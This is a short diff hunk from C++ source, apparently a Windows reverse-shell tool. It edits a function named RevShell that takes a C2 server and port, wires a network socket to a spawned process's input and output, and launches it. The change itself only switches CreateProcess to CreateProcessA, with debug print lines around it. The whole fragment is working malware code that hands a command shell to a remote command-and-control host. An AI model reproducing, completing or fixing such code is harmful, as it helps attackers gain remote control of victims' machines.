@@ -75,7 +75,7 @@ void RevShell(char* C2Server, int C2Port)
 				sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) tcpsock;
 				
 				std::cout << "[DBG] 6\n";
-				CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
+				CreateProcessA(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
 				WaitForSingleObject(pinfo.hProcess, INFINITE);
 				
 				std::cout << "[DBG] 7\n";
